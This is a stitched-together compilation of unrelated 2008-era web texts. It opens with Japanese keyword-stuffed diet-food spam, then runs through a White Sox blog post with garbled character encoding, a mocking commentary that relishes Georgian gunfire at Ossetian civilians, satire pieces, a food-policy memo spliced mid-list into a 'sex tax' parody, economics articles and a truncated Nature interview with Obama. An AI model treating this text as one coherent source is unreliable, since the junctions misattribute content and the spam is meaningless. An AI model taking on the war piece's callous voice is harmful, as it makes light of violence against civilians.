誰にも話したことはありませんが、私にはダイエット 食品 スーパーがあって今後もこのまま保持していくと思います。大袈裟すぎですか？
でも、ダイエット 栄養 食品だったらホイホイ言えることではないでしょう。ダイエット 食品 スーパーは気がついているのではと思っても、ダイエット 食品 通販を考えたらとても訊けやしませんから、ダイエット 食品 安いにはかなりのストレスになっていることは事実です。ダイエット食品に打ち明けて、せいせいした気分になれれば良いのですが、ダイエット 食品 通販をいきなり切り出すのも変ですし、ダイエット食品は自分だけが知っているというのが現状です。ダイエット 食品 スーパーの話題を共有できる人がいたら違うのでしょうけど、ダイエット 食品 置き換えだけは無理とはっきり言う人もいますから、あまり高望みしないことにしています。

Mark Buehrle stepped up , and stepped up big .
Â
And in the process , he just may have helped the Chicago White Sox escape the vicious grip of The Curse of the Douche Bag .
I wrote this morning that it was up to Mark Buehrle to step up and save the season for the Chicago White Sox .
And he did just that .
Pitching on three days rest against the Cleveland Indians at home , Mark Buehrle threw 111 pitches in going 7 strong innings , giving up only a 2nd inning solo shot , and inducing four double plays .
In two of the biggest games the White Sox have played in since the 2005 playoffs , Mark Buehrle has given his team a chance to win .
The Sox couldnâ€™t capitalize Wednesday night against the Twins , but they did today .
And look at who else stepped up : the captain , Paul Konerko .
Last week , I wrote â€ œI think it will be some of the stalwarts from 2005 ( Buehrle , Jenks , JD , AJ , Uribe ) that carry us to the finish line and to another AL Central crown.â€ 
Obviously , I must offer my apologies to Paulie .
He cranked two homeruns yesterday , and hit another one this afternoon to get the scoring going .
But it has certainly been the stars of the 2005 White Sox who have enabled us to weather the storm and continue playing .
Buehrle had a great start today , Paulie has erased the memories of his terrible season with two huge games here at the end , and Jermaine Dye has done everything he can to put runs on the board in support of our struggling pitching staff , adding two more RBIs today .
So whatâ€™s next for the White Sox ?
We play the Detroit Tigers tomorrow , at home on the South Side .
Gavin Floyd , who was our best big game pitcher throughout the summer , will toe the rubber for the Good Guys .
And stepping on the mound for the Tigers ?
Another 2005 White Sox hero , Freddy Garcia .
Garcia has gone five innings in both of his starts this season , giving up 3 homeruns when he faced the Kansas City Royals last week .
As everyone knows , one of the Tigersâ€™ biggest weakness is their leaky bullpen .
Without question , we will get to face that bullpen tomorrow as Freddy simply doesnâ€™t have the endurance right now to go longer than 5 - 6 innings , even if he is throwing well .
And remember , Gavin is 2 - 0 this season against Detroit , almost no-hitting them once back in April .
The Tigers did chase him after four innings the last time he faced them , and Gavin was up and down throughout September , but I feel good about this matchup .
I would not be surprised to see some runs scored early , but Gavin has the ability to go 7 - 8 innings and keep the game away from our own awful bullpen .
If he can do what Mark Buehrle did today , and go seven strong before turning it over to Linebrink / Thornton and then Jenks , I like our chances .
Iâ€™ve been hard on Gavin Floyd at times this year , because his facial expressions do not always inspire confidence , but he has been our best pitcher this season .
Needing a victory today we were able to turn to Mark Buehrle , who stepped up .
Needing one tomorrow , we turn to Gavin Floyd .
Without Mark Buehrle unavailable , and Jose Contreras lost for the season , there is no one Iâ€™d rather have throwing the ball tomorrow than Gavin .
If Paul Konerko and Jermaine Dye can continue to carry the load on offense , this is a game that the White Sox should win .
Assuming we do , that brings Minnesota back to the South Side for a one - game playoff .
I am assuming that John Danks would start for us and I would think that Francisco Liriano would take the mound for Minnesota .
Thatâ€™s a pretty even matchup , but this time we are the ones at home and I just donâ€™t see us losing to the Twins outside of the Metrodome in a game of this magnitude .
Today was a great day for the White Sox , and proved that this team takes on the personality of its manager and never quits fighting .
Today also confirmed the wise thinking of Kenny Williams in locking Mark Buehrle up long term .
We all know that Mark can be up and down throughout a season , but he almost always steps up when the White Sox need him .
Mark Buehrle did what Javier Vazquez has been unable to do , and showed our young pitchers what it means to be an ace .
Weâ€™ll find out tomorrow if Gavin Floyd learned from Markâ€™s example .
The White Sox won the World Series in 2005 for a reason .
The reason is that Mark Buehrle , Paul Konerko , and Jermaine Dye , among others , are talented veterans who have the ability to rise to the occasion and produce in big spots .
In 2008 , those very same guys have stepped up and pulled the White Sox back from the brink of total implosion .
I know itâ€™s a clichÃ© when said in reference to the White Sox , but this team and its fans simply donâ€™t stop believing .
Thatâ€™s why I have total faith that Monday and Tuesday will result in victories and the White Sox will be playing October baseball .
And other than the Red Sox , what other team has experienced veterans like the White Sox ?
Just get to October boys , because 2008 still has the potential to be just as special as 2005 .
We have to get there first , but Mark Buehrle , Paul Konerko , and Jermaine Dye give us all plenty of reasons to believe that we can , and will .

Here ’s some more cool combat vids for you desk casualties .
This time it ’s Georgian troops shooting the Hell out of the South Ossetian capital , Tskhinvali , on the day they rolled in to retake the province after Bush and Cheney promised them the Russians would n’t dare do a thing .
So it did n’t work out all that great , but on that first day , when it was Georgian upgraded T - 72s vs. Ossetian civvies with AK - 47s , our little allies had themselves a real barnburner of a time , and luckily , one of them took these vids to show his little Facebook friends .
This vid shows the happiest man in Georgia on that day ( August 8 ) , some Georgian redneck doing exactly what we ’ve all dreamed of doing : rolling down the main drag of an enemy city with both hands on a heavy machine gun , looking for any civilian dumb enough to poke his or her head up .
This guy actually yells , “ Yee - haw ! ” every now and then , after firing off a short burst at an apartment building or park .
It ’s so much like an American “ Yee - haw ! ” I ca n’t help wondering if he learned it special , from those Special Forces instructors we sent down there to teach the Georgians how to fight .
He ’s easy to please , this guy ; he ’s sitting there holding a big gun with nice easy D - grips for both hands , with a huge ox - tongue trigger he can trip with his thumb , and every now and then he fires a burst into a tree just to keep those Ossetian squirrels from going insurgent .
I ’m going to dream of this one for a long , long time .
This one is guys doing the same thing , rolling down a dusty Ossetian street taking small arms fire , but they do n’t seem to be having as much fun with it .
Maybe because this one ’s filmed inside some jeep - thing that does n’t seem to have any armament .
Or maybe the weapon is up top and I ca n’t see it in the video .
The guys in the vehicle yell at each other nonstop but since they ’re talking Georgian , I have no idea what they ’re saying .
All I know is they do n’t sound near as happy as the man with the machine gun .
Probably it ’s the usual chatter you hear on combat - vehicle videos , a mixture of backseat drivers telling the driver where to turn and the squad coward screeching about an imaginary enemy tank coming around the corner .
They ’re hiding , this bunch of geeks , behind a T - 72 , and you watch it proceeding down the street like a lowslung pit bull , turret swiveling just like those American instructors taught them to do .
And you hear a nonstop chatter of small arms fire , but one thing you learn after watching a lot of combat video is that unaimed , non-sniper small arms fire is nothing to worry about if you ’re in any kind of halfway decent armored vehicle , or even in a decent trench , or rubble pile .
There ’s a reason soldiers only perk up when they hear engines coming : it takes some serious Detroit iron to mount a gun that can cut through the clutter and zap people at any distance .
So this jeep or whatever tools down the street , scared and jumpy , hugging the tank ’s ass , but nothing happens to it .
A lot seems to have happened to the street it ’s going down , though .
Those Georgians may try to come off the poor victims but I dunno , guys , there ’s a lot of blownup shit in every shot I ’ve seen of Tskhinvali , and those “ Yee - haws ” from the gunner kinda make it sound like the Georgians were having themselves a real party , Quantrill style .

Kevin is an awesome dad .
Because only a truly awesome dad would make a completely amazing Mega Man costume for his son , complete with light - up mega blaster .
Sure , his kid was definitely not around when Mega Man was originally released , but I 'm sure he 's enjoyed dying over and over and over again in Mega Man 9 just like the rest of us .
He used both red and yellow LEDs for the buster , making the gun part of it red while the power meter is a cool yellow .
Seriously , this is amazing .
He 's still putting together the rest of the costume , but it 's safe to say that it 'll be a sad day when his son outgrows this thing .
If I had one of these in my size , I 'd wear it at least once a week .

The Times article seemed dramatically at odds with one in The Washington Post two days earlier .
The Post article quoted McCain advisers as saying that Palin had been thoroughly vetted , including an F.B.I. background check , and that , “ Far from being a last - minute tactical move or second choice when better - known alternatives were eliminated , Palin was very much in McCain ’s thinking from the beginning of the selection process . ”
So was The Times story wrong , as the McCain camp said ?
It did contain one error .
It said that one potentially embarrassing revelation about Palin was her membership for two years in the Alaskan Independence Party , which favors a vote on whether the state should secede .
The assertion was based on an announcement by the party ’s chairwoman , Lynette Clark , which The Times failed to tell readers .
That was a mistake .
“ We should have attributed it , ” Bumiller said .
The next day , Clark said she had been wrong .
It turns out that Palin ’s husband , Todd , had belonged to the party for a time , and she had addressed its annual convention .
The Times corrected the error in two follow - up stories .
But the main thrust of its reporting on the vetting process appears to be holding up .
The Post said the next day that a lengthy in - person background interview of Palin by the head of McCain ’s vetting team did not happen until the day before she was chosen .
It also acknowledged that it had been incorrect when it reported that the F.B.I. had checked out Palin .
In her home state , the Anchorage Daily News reported that it had found only one person who was asked anything about the governor before McCain selected her .
That was the attorney representing her in an investigation of whether she had abused her power in office .
“ We stand by our reporting , ” said Richard Stevenson , the editor in charge of Times election coverage .
Many readers , like John Southerland of Ocala , Fla. , compared The Times ’s handling of John Edwards ’s extramarital affair and Bristol Palin ’s pregnancy and accused the newspaper of a double standard .
The newspaper did not seriously pursue the story about Edwards , a populist Democrat , for months , but it put three stories involving Bristol Palin on the first page of its
Web site and two on the front page of the printed paper .
I took The Times to task for not trying to report the Edwards story until he acknowledged his affair , but once Edwards came forward , The Times put it on the front page and continued digging .
In Palin ’s case , the first hint of the daughter ’s pregnancy was the family ’s announcement of it , and once that happened , it was front - page news everywhere , including the conservative Washington Times .
Palin was the anointed Republican vice presidential candidate , and her family was very much part of the biography she was presenting to voters .
Two of the New York Times articles were not directly about Bristol Palin : they were about how well McCain researched his choice and about women ’s discussions on how Sarah Palin could balance the demands of the vice presidency with the demands of having a pregnant teenager , a baby with Down syndrome and two other children at home .
A piece of art by Damien Hirst has set the new record for a single item at auction .
The piece entitled ‘ Oh Shit ’ fetched £ 2.3 bn after frantic bidding by an anonymous investor .
The work , which features a Merrill Lynch employee suspended in a tank of formaldehyde secured the highest price yet paid for a single piece of banking history .
It was believed that it was purchased for a private exhibit , and is unlikely to be put on display to the public or auditors , in the immediate future .
‘ Pay Day ’ , a piece comprised of empty envelopes and which was expected to make between 4,000 to 5,000 people happy , eventually went to administrators Price Waterhouse Coopers for well over the asking price .
Art critic Mathias Van -Leer praised Hirst for his courageous decision to sell all these works from his Financial Meltdown period .
‘ It is a remarkable that Damien has been able to command these sort of prices , ’ he said , ‘ especially as we are seeing a lot of similar pieces suddenly coming onto the market . ’
The success of the Hirst auction is in contrast to the fortunes of artists and brothers Jake and Dinos Lehman who were unable to find a buyer for their latest work , ‘ White Elephant ’ .
This has led some art experts to claim that the market will be unlikely to secure the same sort of money for other historic banking institutions , and some predict that the bubble will burst sooner rather than later .
Daily Telegraph art critic Mark Walker - Brice is one of the sceptical voices ; ‘ I mean we ’ve seen this all before , have n’t we ?
I mean , this is just Northern Rock Bank Clerk , given a transatlantic sheen and passed off as the next big thing . ’
Meanwhile , Hirst ’s agent said he was delighted at the amount raised by the sale of his latest work .
‘ Although we ’re a bit worried about where he should deposit the cheque . ’

An Immodest Proposal : Time for a Sex Tax
Whereby :
+ It has been observed that Democrats are generally in favor of taxation and Republicans are generally opposed to unnecessary sexual activity ; and whereby : +
The unintended costs of sexual activity are unacceptably high , particularly in the political arena ( c.f. Messrs .
Clinton , Foley , Craig , Edwards , and most recently one Mr. Levi Johnston , to name just a fraction of the available examples ) ; and whereby : +
The pursuit of sex is also extremely costly beyond the political realm , in terms of lost productivity , unwanted pregnancies , sexually transmitted diseases , and ruined marriages ( and other committed relationships ) ; and whereby : +
The federal government is now , as always , in need of more money ;
It is hereby proposed that a new “ sex tax ” shall be levied upon the citizens of these United States .
Let it be clear that the aim of said tax is not to deter sexual activity itself , but rather to capture some of the costs imposed by certain extraneous sexual activity that , especially once made public , tends to divert precious resources from more worthy subjects ; to this end :
+ Married couples will receive a substantial credit for sanctioned , in - home sexual activity ; and , conversely : +
The highest rates shall be paid for premarital , extramarital , and otherwise unusual or undesirable sexual activity ; and : + Sexual activity between members of the same gender ; or activity between more than two participants ; or in an airplane , on a beach , or in other “ nontraditional ” settings shall surely be taxed at a higher , though heretofore undetermined , rate .
Also to be determined is a scale for noncoital activity .
The Internal Revenue Service shall be granted the full and complete authority to collect said tax .
Furthermore :
+ Payment of said tax , while voluntary , is no more voluntary than payments or credits on other tax - related activities such as : charitable contributions , business - related deductions , and cash received for goods and services , and is therefore expected to stimulate a very acceptable rate of compliance ; additionally : +
Taxpayers will create a sexual paper trail that could prove advantageous in countless future scenarios , including but not limited to : employment , courtship , and participation in the political process ; and : +
The typical I.R.S. audit would become considerably more interesting for the auditor , and interesting work is a much - needed incentive to attract and retain qualified I.R.S. employees .
It should be acknowledged that determining an acceptable name for said tax may be politically difficult , much like the “ estate tax ” and the “ death tax ” are in fact nomenclaturally diverse versions of the same tax used by opposing parties ; candidates to consider include : the Family Creation Tax ; the Extracurricular Intercourse and Lesser Sex Act Tax ; and the Shtup Tax .
Furthermore :
Finally , there is the power of the example you set in the White House .
If what ’s needed is a change of culture in America ’s thinking about food , then how America ’s first household organizes its eating will set the national tone , focusing the light of public attention on the issue and communicating a simple set of values that can guide Americans toward sun-based foods and away from eating oil .
The choice of White House chef is always closely watched , and you would be wise to appoint a figure who is identified with the food movement and committed to cooking simply from fresh local ingredients .
Besides feeding you and your family exceptionally well , such a chef would demonstrate how it is possible even in Washington to eat locally for much of the year , and that good food need n’t be fussy or complicated but does depend on good farming .
You should make a point of the fact that every night you ’re in town , you join your family for dinner in the Executive Residence  at a table .
( Surely you remember the Reagans ’ TV trays . )
And you should also let it be known that the White House observes one meatless day a week  a step that , if all Americans followed suit , would be the equivalent , in carbon saved , of taking 20 million midsize sedans off the road for a year .
Let the White House chef post daily menus on the Web , listing the farmers who supplied the food , as well as recipes .
Since enhancing the prestige of farming as an occupation is critical to developing the sun- based regional agriculture we need , the White House should appoint , in addition to a White House chef , a White House farmer .
This new post would be charged with implementing what could turn out to be your most symbolically resonant step in building a new American food culture .
And that is this : tear out five prime south - facing acres of the White House lawn and plant in their place an organic fruit and vegetable garden .
When Eleanor Roosevelt did something similar in 1943 , she helped start a Victory Garden movement that ended up making a substantial contribution to feeding the nation in wartime .
( Less well known is the fact that Roosevelt planted this garden over the objections of the U.S.D.A. , which feared home gardening would hurt the American food industry . )
By the end of the war , more than 20 million home gardens were supplying 40 percent of the produce consumed in America .
The president should throw his support behind a new Victory Garden movement , this one seeking “ victory ” over three critical challenges we face today : high food prices , poor diets and a sedentary population .
Eating from this , the shortest food chain of all , offers anyone with a patch of land a way to reduce their fossil - fuel consumption and help fight climate change .
( We should offer grants to cities to build allotment gardens for people without access to land . )
Just as important , Victory Gardens offer a way to enlist Americans , in body as well as mind , in the work of feeding themselves and changing the food system  something more ennobling , surely , than merely asking them to shop a little differently .
I do n’t need to tell you that ripping out even a section of the White House lawn will be controversial : Americans love their lawns , and the South Lawn is one of the most beautiful in the country .
But imagine all the energy , water and petrochemicals it takes to make it that way .
( Even for the purposes of this memo , the White House would not disclose its lawn - care regimen . )
Yet as deeply as Americans feel about their lawns , the agrarian ideal runs deeper still , and making this particular plot of American land productive , especially if the First Family gets out there and pulls weeds now and again , will provide an image even more stirring than that of a pretty lawn : the image of stewardship of the land , of self - reliance and of making the most of local sunlight to feed one ’s family and community .
The fact that surplus produce from the South Lawn Victory Garden ( and there will be literally tons of it ) will be offered to regional food banks will make its own eloquent statement .
You ’re probably thinking that growing and eating organic food in the White House carries a certain political risk .
It is true you might want to plant iceberg lettuce rather than arugula , at least to start .
( Or simply call arugula by its proper American name , as generations of Midwesterners have done : “ rocket . ” )
But it should not be difficult to deflect the charge of elitism sometimes leveled at the sustainable - food movement .
Reforming the food system is not inherently a right - or - left issue : for every Whole Foods shopper with roots in the counterculture you can find a family of evangelicals intent on taking control of its family dinner and diet back from the fast - food industry  the culinary equivalent of home schooling .
You should support hunting as a particularly sustainable way to eat meat  meat grown without any fossil fuels whatsoever .
There is also a strong libertarian component to the sun-food agenda , which seeks to free small producers from the burden of government regulation in order to stoke rural innovation .
And what is a higher “ family value , ” after all , than making time to sit down every night to a shared meal ?
Our agenda puts the interests of America ’s farmers , families and communities ahead of the fast - food industry ’s .
For that industry and its apologists to imply that it is somehow more “ populist ” or egalitarian to hand our food dollars to Burger King or General Mills than to support a struggling local farmer is absurd .
Yes , sun food costs more , but the reasons why it does only undercut the charge of elitism : cheap food is only cheap because of government handouts and regulatory indulgence ( both of which we will end ) , not to mention the exploitation of workers , animals and the environment on which its putative “ economies ” depend .
Cheap food is food dishonestly priced  it is in fact unconscionably expensive .
Your sun-food agenda promises to win support across the aisle .
It builds on America ’s agrarian past , but turns it toward a more sustainable , sophisticated future .
It honors the work of American farmers and enlists them in three of the 21st century ’s most urgent errands : to move into the post - oil era , to improve the health of the American people and to mitigate climate change .
Indeed , it enlists all of us in this great cause by turning food consumers into part - time producers , reconnecting the American people with the American land and demonstrating that we need not choose between the welfare of our families and the health of the environment  that eating less oil and more sunlight will redound to the benefit of both .
Since 1910 , the National Oceanic and Atmospheric Administration ( NOAA ) has calculated the nation ’s seafood consumption rates to keep consumers and the industry informed about trends in seafood consumption and trade .
According to this year ’s report , Americans consumed a total of 4.908 billion pounds of seafood in 2007 , slightly less than the 4.944 billion pounds in 2006 .
The average American ate 16.3 pounds of fish and shellfish in 2007 , a one percent decline from the 2006 consumption figures of 16.5 pounds .
But even though U.S. seafood consumption is flat , global consumption continues to grow ; a major study in the journal Science predicts the global collapse of the world ’s major fisheries by the middle of this century .
Already , over the past 50 years , there has been a 90 percent reduction of the ocean ’s large predatory fish , including sharks , swordfish and tuna .
What most concerns NOAA ’s National Marine Fisheries Service , a division of the Department of Commerce , is the growth in imported farm - raised seafood coupled with declines global fishstocks .
The nation imports about 84 percent of its seafood , a steadily increasing proportion .
Imports accounted for only 63 percent of U.S. seafood just a decade ago .
“ While NOAA works to end overfishing and rebuild wild fish stocks , the U.S. also needs more sustainable domestic aquaculture to help meet consumer demand for healthy seafood and narrow the foreign trade gap , ” said Jim Balsiger , acting NOAA assistant administrator for NOAA ’s Fisheries Service .
“ The National Offshore Aquaculture Act of 2007 , pending before Congress , would provide a clear permitting process for businesses and individuals to develop safe , sustainable aquaculture in U.S. federal waters . ”
Ecological impacts of aquaculture
At least half of the seafood imported to the U.S. is farmed .
Aquaculture production in the rest of the world has expanded dramatically in the last 30 years and now supplies half of the world seafood demand , according to the United Nations Food and Agriculture Organization .
America ’s aquaculture industry , currently meets only 5 to 7 percent of U.S. demand for seafood , and most of that is catfish .
Despite the low percentage as a total of U.S. consumption , aquaculture still represents the fastest - growing sector in the American agricultural sector .
Many of the aquaculture farms operate without a negative impact on the environment .
In fact , catfish , tilapia , and freshwater carp can convert harmful organic wastes into edible fish meal .
But the ecological
impact of some types of aquaculture have groups urging caution in the growth of the industry .
For example , the farming of shrimp and salmon has been found to be particularly damaging to the environment .
When the cages are crowded , uneaten feed , fish wastes and antibiotics are released from the cages .
As a source of nutrient pollution , these wastes create high levels of nutrients that increase the growth of phytoplankton and algae .
The eventual degradation of algae drastically reduces the levels of oxygen in the water .
In salmon aquaculture , one of the primary concerns has been preventing escapes of farmed fish into the ocean where they can spread disease and out - compete native fish for marine habitat .
The floating netcages that confine the farmed fish are usually stocked at high densities to maximize profit , creating conditions that are conducive to outbreaks of contagious diseases and parasites .
A number of viral and bacterial pathogens have plagued the industry that at times destroy thousands of farmed fish .
For the reasons stated above , one can see why NOAA ’s fisheries arm wants legislation in place to provide greater levels of regulatory guidance for the marine aquaculture industry .
However , as long as foreign - raised fish is cheaper , it will continue to outsell the domestically - farmed varieties .
It seems that once again our penchant for “ free trade ” is incongruous with our desire to implement environmental regulations ; begging the question , while domestic guidance is important , would n’t an international framework that established best practices for aquaculture be better ?

Now that President Bush has signed the Troubled Asset Relief Program into law , economists do n’t expect it to reverse the economic slowdown , restore jobs or bring back easy mortgages .
So , how will taxpayers know the $ 700 billion Wall Street bailout is actually getting the job done ?
If it works , it should thaw a freeze in the credit markets , make loans more available and cut down on bank failures .
Eventually it might even help housing markets .
“ No one should expect immediate recovery , but I believe this is overall a positive step , ” said Ronnie Phillips , an economics professor at Colorado State University .
Critics , such as former Treasury Secretary Paul O’Neill , view the plan as a gross intrusion by government into the private sector and a waste of taxpayer funds .
Some who support a rescue plan think TARP may fail because it targets the wrong end of the housing market .
“ Without help for the bottom of the pyramid , Wall Street will be back next year asking for another trillion dollars , ” said Timothy Canova , professor of international economic law at Chapman University in Orange , Calif .
Below are some areas by which to measure the plan ’s success or failure .
Home prices
One thing many consumers are eager to see , rising home values , may take the longest time to achieve .
“ Look at the inventory of unsold houses both new and existing .
You need to look at the amount of mortgages being generated , ” said Campbell Harvey , a finance professor at Duke University .
Although no -money - down financing is a thing of the past , easier terms on mortgages will show that the crisis is easing , adds Phillips .
“ We should see some reduction or slowdown in home - mortgage defaults .
This may take a couple of months at least after TARP becomes effective , ” he said .
If defaults flatten out and inventories of homes for sale shrink , that should ease the downward pressure on home prices .
What to watch : The S&P / Case Shiller Home Price Indices and the OFHEO House Price Index are two home price measures that will signal a bottom in housing .
Stock prices
A government agreement to purchase up to $ 700 billion in mortgage - backed securities and other troubled assets is at the heart of TARP .
“ Those institutions that sell assets to TARP should see increases in their stock prices , ” Phillips said .
A rally in bank , insurance and brokerage stocks could signal that TARP is working .
But stocks overall could still fall on worries that a deepening recession will hurt future profits .
Rising yields on short - term Treasuries and a drop in gold prices are two signs that investors have become more comfortable holding stocks .
The current crisis originated with subprime mortgage - backed securities , and how they respond to the plan will be crucial , said Fred Dickson , chief market strategist with The Davidson Cos. in Great Falls , Mont .
What to watch : The ABX “ AAA ” Subprime Mortgage Swap Index , which tracks the highest rated risky mortgages .
The index , which traded at 42 cents on the dollar two weeks ago , is faring better , closer to 52 cents .
Bond market
Major stock indexes fell Friday despite passage of the plan , but that ’s not entirely a surprise .
Commercial paper , municipal - bond and corporate - bond markets are expected to benefit before equities .
“ Investors pulled money from their municipal money - market funds and fled to Treasury - only money - market funds , ” said Ken Harris , a research analyst with Denver Investment Advisors , a mutual - fund manager .
In particular , debt markets that set interest rates on a short - term basis froze up , causing rates to spike for government and business borrowers alike .
California is poised to ask the federal government for a $ 7 billion loan after its financing sources dried up .
Closer to home , Denver International Airport is paying 12 percent interest on some of its debt after buyers disappeared .
A positive sign would be an increase in the supply of commercial paper or short - term debt issued by corporations .
That market dipped to $ 1.6 trillion on Oct. 1 , a three - year low .
More commercial paper and falling yields on corporate bonds will make it easier for large businesses to obtain capital .
What to watch : Lower yields on municipal and corporate bonds would signal that confidence has returned .
LIBOR falls
An immediate sign that TARP is restoring confidence would be a a drop in the London Interbank Offered Rate ( LIBOR ) , a measure of the willingness of banks to lend to each other overnight .
Banks that are n’t lending to each other are n’t going to be eager to lend to consumers and businesses .
“ Our problem is a credit problem .
Small and medium businesses are having a terrible time getting the simplest of loans , ” said Harvey , the Duke University professor .
If credit markets remain frozen in coming weeks , then TARP is dead on arrival , he said .
Looser credit markets will show up with a smaller spread between LIBOR and the overnight indexed swap rate , said economist Michael Orlando , formerly with the Federal Reserve .
Rising LIBOR rates are damaging for another reason — most adjustable - rate mortgages in the U.S. use the benchmark to determine what borrowers will pay .
Reduced borrowing from the Federal Reserve also will indicate credit markets are easing , adds Louis Llanes , a money manager with Blythe Lane Investment Management in Greenwood Village .
Banks and securities firms had borrowed $ 348.2 billion from the Federal Reserve last week , a 60 percent jump from the week before .
What to watch :
The spread between the 3 - month LIBOR and the overnight indexed swap , which rose to an all - time record 2.81 percent on Friday versus a more typical spread of 0.11 percent .

Paulson Should Resign :
Hank Paulson knows a lot about Wall Street .
But he also knows a lot of the guys on Wall Street .
And I fear that is the problem .
From the beginning this whole bailout smelled more like welfare for his Wall Street billionaire cronies rather than for the good of the country .
Not a single Wall Street guy has come forward and offered to do anything to make the bailout work but instead the attitude that has emanated from those quarters has been one of entitlement and arrogance .
While his experience is obviously valuable , I believe that Paulson 's close relationship with Wall Street has provided a skepticism about the bailout .
His opening offer to Congress was so arrogant and so lopsided in favor of Wall Street and his own powers , that it basically smacked of bad faith .
Perhaps he was acting in good faith -- but I think that Congress and the American people were skeptical .
I sure as heck know I was .
He did nothing to demonstrate that he was any different in character or integrity from the guys who got us into this and now want us to bail them out .
We now know enough about the integrity of these guys to be skeptical about anything that they touch .
Hank Paulson is not an economist .
He has not explained why he believed the blunderbuss bailout was the only option that would work .
As the President of BB&T noted in his letter on the bailout , it appears that he knows nothing about commercial banking or exactly how or when the credit problems would trickle down to " Main Street . "
Paulson should resign .
If the same deal were negotiated with someone other than an old Wall Street crony , I think that many people would look on it differently .
But as things stand , I think he is fatally flawed .
If he really thinks that a bailout is what is best for the country , then he should resign .
And let someone with greater independence from Wall Street come in and study the issue and see if this massive bailout plan is still necessary .

News Feature : Q&A
Barack Obama accepted Nature 's invitation to answer 18 science - related questions in writing ; John McCain 's campaign declined .
Obama 's answers to many of the questions are printed here ; answers to additional questions ( on topics including biosecurity , the nuclear weapons laboratories and US participation in international projects ) can be found at http://www.nature.com/uselection.
Wherever possible , Nature has noted what McCain has said at other times on these topics .
What will be your highest priority in the science and technology arena ?
Barack Obama : I am committed to strengthening US leadership in science , technology and innovation , and doing so will be a central priority for my administration .
Our talent for innovation is still the envy of the world , but we face unprecedented challenges that demand new approaches .
For example , the United States annually imports $ 53 billion more in advanced technology products than we export .
China is now the world 's number one high - technology exporter .
This competitive situation may only worsen over time because the number of US students pursuing technical careers is declining .
The United States ranks 17th among developed nations in the proportion of college students receiving degrees in science or engineering ; we were in third place thirty years ago .
Federally supported basic research , aimed at understanding many features of nature — from the size of the Universe to subatomic particles , from the chemical reactions that support a living cell to interactions that sustain ecosystems — has been an essential feature of American life for over fifty years .
While the outcomes of specific projects are never predictable , basic research has been a reliable source of new knowledge that has fuelled important developments in fields ranging from telecommunications to medicine , yielding remarkable rates of economic return and ensuring American leadership in industry , military power and higher education .
I believe that continued investment in fundamental research is essential for ensuring healthier lives , better sources of energy , superior military capacity , and high - wage jobs for our nation 's future .
D. DOVARGANES /AP
Yet , today , we are clearly under - investing in research across the spectrum of scientific and engineering disciplines .
Federal support for the physical sciences and engineering has been declining as a fraction of gross domestic product for decades , and , after a period of growth of the life sciences , the National Institutes of Health ( NIH ) budget has been steadily losing buying power for the past six years .
As a result , our science agencies are often able to support no more than one in ten proposals that they receive , arresting the careers of our young scientists and blocking our ability to pursue many remarkable recent advances .
Furthermore , in this environment , scientists are less likely to pursue the risky research that may lead to the most important breakthroughs .
Finally , we are reducing support for science at a time when many other nations are increasing it , a situation that already threatens our leadership in many critical areas of science .
This situation is unacceptable .
As president , I will increase funding for basic research in physical and life sciences , mathematics and engineering at a rate that would double basic research budgets over the next decade to support our scientists and restore US scientific leadership .
John McCain has similarly promised to fight for increased funding at some of the country 's leading science agencies , but without specific targets in terms of dollars or time frames .
" Under a McCain administration , science and research will have a very high priority , " says Jay Khosla , who advises the campaign on health policy issues .
" He will do everything it takes to ensure we will continue to be leaders , especially in the field of innovation . "
One potentially major stumbling block to those looking for more research funding : McCain has said he would freeze domestic discretionary spending , which includes science money , for one year if elected in order to help trim overall spending levels .
In general , McCain has stressed less government control and more business - and technology - oriented approaches to spurring innovation , such as a $ 300 million prize for advanced battery technology .
On the campaign trail he touches on many of the same themes as Obama , such as the perceived need to educate more American scientists and engineers ; McCain would , for instance , provide bonuses for high - performing teachers in subjects such as maths and science , and support education programmes at science agencies such as the National Science Foundation and the Department of Energy .
Biomedical innovation is expensive and very slow ; it takes $ 1 billion and the better part of a decade to develop a new drug .
What would your administration do to make it easier to turn research into cures ?
Obama : Americans have good reasons to be proud of the extraordinary role that medical science has had in combating disease , here and throughout the world , over the past century .
Work sponsored by the NIH , other government agencies and our pharmaceutical and biotechnology industries has produced many vaccines , drugs and hormones that have improved the quality of life , extended life expectancy and reduced the dire consequences of many serious illnesses and disabilities .
While it may never be easy to " turn research into cures " , I understand that biomedical scientists are seeing enhanced opportunities to use their science to improve health .
I will encourage the development of biological markers of disease that might simplify the evaluation of new therapies , the use of genetic information to select patients most likely to benefit from new treatments , and the multi-disciplinary efforts that are now possible at many research centres .
In addition , I will support increased attention to research that focuses on prevention , early detection and improved management of disease .
Furthermore , I believe there is more that we can do to ensure new treatments are developed and made available to the public more efficiently .
I believe that we must increase funding for the NIH to reverse the funding trends that have left our nation 's scientists with fewer resources as research costs escalate .
We must also do a better job of providing resources to the Food and Drug Administration ( FDA ) , the Centers for Disease Control and Prevention ( CDC ) , and other federal agencies that help ensure that when these medical advances are turned into exciting new treatments , we are able to ensure that they are swiftly and safely considered for widespread usage .
Additionally , we must prioritize removing barriers both between federal agencies and across public , private and nonprofit organizations to ensure better and more efficient collaboration on new innovations .
McCain has also said he would strongly support funding for the NIH .
" McCain wants to make sure we are doing everything possible to give the young scientists of today the resources they need to go out and bring research to cures , " says Khosla .
The health - care platforms of both candidates tend to focus on how to make health insurance more affordable and accessible to Americans , and McCain has talked about technologies that could benefit public health — such as telemedicine — to bring the latest medical knowledge to many more patients .
Many scientists are bitter about what they see as years of political interference in scientific decisions at federal agencies .
What would you do to help restore impartial scientific advice in government ?
ED KASHI / CORBIS
Obama : Scientific and technological information is of growing importance to a range of issues .
I believe such information must be expert and uncoloured by ideology .
I will restore the basic principle that government decisions should be based on the best - available , scientifically valid evidence and not on the ideological predispositions of agency officials or political appointees .
More broadly , I am committed to creating a transparent and connected democracy , using cutting - edge technologies to provide a new level of transparency , accountability and participation for America 's citizens .
Policies must be determined using a process that builds on the long tradition of open debate that has characterized progress in science , including review by individuals who might bring new information or contrasting views .
I have already established an impressive team of science advisers , including several Nobel laureates , who are helping me to shape a robust science agenda for my administration .
In addition I will :
• Appoint individuals with strong science and technology backgrounds and reputations for integrity and objectivity to the growing number of senior management positions in which decisions must incorporate science and technology advice .
These positions will be filled promptly with ethical , highly qualified individuals on a non-partisan basis ;
• Establish the nation 's first Chief Technology Officer ( CTO ) to ensure that our government and all its agencies have the right infrastructure , policies and services for the twenty - first century .
The CTO will lead an interagency effort on best - in - class technologies , sharing of best practices and safeguarding of our networks ;
